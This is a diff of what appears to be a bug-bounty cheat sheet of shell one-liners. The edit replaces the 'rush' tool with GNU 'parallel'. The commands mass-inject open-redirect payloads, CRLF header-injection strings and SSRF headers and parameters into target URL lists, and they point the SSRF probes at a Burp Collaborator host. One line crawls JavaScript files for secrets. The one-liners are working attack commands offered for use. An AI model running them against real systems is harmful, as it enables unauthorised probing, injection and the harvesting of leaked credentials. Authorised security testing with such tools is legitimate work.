@@ -36,15 +36,15 @@ cat redirect.txt | qsreplace "https://redirect.com" | rush -j40 'if curl -Iks -m
 
 # Test Case 2
 
-cat redirect.txt | qsreplace "redirect.com" | rush -j40 'if curl -Iks -m 10 "{}" | grep -E "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "Open Redirect found on {}"; fi'
+cat redirect.txt | qsreplace "redirect.com" | parallel -j40 'if curl -Iks -m 10 "{}" | grep -E "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "Open Redirect found on {}"; fi'
 
 # Test Case 3
 
-cat redirect.txt | qsreplace "////;@redirect.com" | rush -j40 'if curl -Iks -m 10 "{}" | grep -E "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "Open Redirect found on {}"; fi'
+cat redirect.txt | qsreplace "////;@redirect.com" | parallel -j40 'if curl -Iks -m 10 "{}" | grep -E "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "Open Redirect found on {}"; fi'
 
 # Test Case 4
 
-cat redirect.txt | qsreplace "/////redirect.com" | rush -j40 'if curl -Iks -m 10 "{}" | grep -E "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "Open Redirect found on {}"; fi'
+cat redirect.txt | qsreplace "/////redirect.com" | parallel -j40 'if curl -Iks -m 10 "{}" | grep -E "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "Open Redirect found on {}"; fi'
 
 ## Extract urls from Js files:
 
@@ -53,29 +53,29 @@ cat js.txt | while read line; do curl $line -s -k; done | grep -oh "\"\/[a-zA-Z0
 
 ## CRLF On Live Urls with Parameters:
 
-cat urls.txt | qsreplace "%0d%0acrlf:crlf" | rush -j40 'if curl -skI -m 10 "{}" | grep -q "^crlf:crlf"; then echo "CRLF found on {}"; fi'
+cat urls.txt | qsreplace "%0d%0acrlf:crlf" | parallel -j40 'if curl -skI -m 10 "{}" | grep -q "^crlf:crlf"; then echo "CRLF found on {}"; fi'
 
 # Test1:
 
-cat urls.txt | qsreplace "%E5%98%8D%E5%98%8Acrlf:crlf" | rush -j40 'if curl -skI -m 10 "{}" | grep -q "^crlf:crlf"; then echo "CRLF found on {}"; fi'
+cat urls.txt | qsreplace "%E5%98%8D%E5%98%8Acrlf:crlf" | parallel -j40 'if curl -skI -m 10 "{}" | grep -q "^crlf:crlf"; then echo "CRLF found on {}"; fi'
 
 # Test2:
 
-cat urls.txt | qsreplace "%E5%98%8D%E5%98%8Acrlf:crlf" | rush -j40 'if curl -skI -m 10 "{}" | grep -q "^crlf:crlf"; then echo "CRLF found on {}"; fi'
+cat urls.txt | qsreplace "%E5%98%8D%E5%98%8Acrlf:crlf" | parallel -j40 'if curl -skI -m 10 "{}" | grep -q "^crlf:crlf"; then echo "CRLF found on {}"; fi'
 
 
 ## SSRF on doamins:
 # Replace $2 with your burp collaborator server.
 
-cat live-domains | rush -j40 'if curl -skL -o /dev/null "{}" -H "CF-Connecting_IP: $2" -H "From: root@$2" -H "Client-IP: $2" -H "X-Client-IP: $2" -H "X-Forwarded-For: $2" -H "X-Wap-Profile: http://$2/wap.xml" -H "Forwarded: $2" -H "True-Client-IP: $2" -H "Contact: root@$2" -H "X-Originating-IP: $2" -H "X-Real-IP: $2"; then echo "{}" | ts; fi' | tee -a ssrf-headers-out.txt
+cat live-domains | parallel -j40 'if curl -skL -o /dev/null "{}" -H "CF-Connecting_IP: $2" -H "From: root@$2" -H "Client-IP: $2" -H "X-Client-IP: $2" -H "X-Forwarded-For: $2" -H "X-Wap-Profile: http://$2/wap.xml" -H "Forwarded: $2" -H "True-Client-IP: $2" -H "Contact: root@$2" -H "X-Originating-IP: $2" -H "X-Real-IP: $2"; then echo "{}" | ts; fi' | tee -a ssrf-headers-out.txt
 
 ## SSRF on urls containing parameters:
 
-cat urls.txt | qsreplace "your.burpcollaborator.server" | rush -j40 'if curl -skL "{}" -o /dev/null; then echo "{}" | ts; fi' | tee -a ssrf-output-log.txt
+cat urls.txt | qsreplace "your.burpcollaborator.server" | parallel -j40 'if curl -skL "{}" -o /dev/null; then echo "{}" | ts; fi' | tee -a ssrf-output-log.txt
 
 # Test 2:
 
-cat params.txt | qsreplace "http://$1" | rush -j40 'if curl -skL "{}" -o /dev/null; then echo "{}" | ts; fi' | tee -a ssrf-output-log.txt
+cat params.txt | qsreplace "http://$1" | parallel -j40 'if curl -skL "{}" -o /dev/null; then echo "{}" | ts; fi' | tee -a ssrf-output-log.txt
 
 
 ## SpringBoot Actuator Check One Liner on domains:
@@ -103,7 +103,7 @@ cat alive.txt | parallel 'curl -skL "{}" | grep "type\=\"hidden\"" | grep -Eo "n
 
 ##  Find Secrets in Javascripts files via crawling:
 
-cat alive.txt | rush 'hakrawler -plain -js -depth 2 -url {}' | rush 'python3 /root/Tools/SecretFinder/SecretFinder.py -i {} -o cli' | anew secretfinder
+cat alive.txt | parallel 'hakrawler -plain -js -depth 2 -url {}' | rush 'python3 /root/Tools/SecretFinder/SecretFinder.py -i {} -o cli' | anew secretfinder
 
 ## Directory Bruteforce using dirsearch and ffuf
 
